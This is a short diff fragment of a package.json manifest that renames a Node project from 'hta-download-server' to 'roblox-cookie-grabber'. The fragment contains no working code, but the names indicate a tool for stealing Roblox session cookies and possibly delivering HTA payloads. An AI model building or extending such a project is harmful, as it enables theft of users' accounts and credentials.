@@ -1,5 +1,6 @@
+// === package.json ===
 {
-  "name": "hta-download-server",
+  "name": "roblox-cookie-grabber",
   "version": "1.0.0",
   "main": "server.js",
   "scripts": {
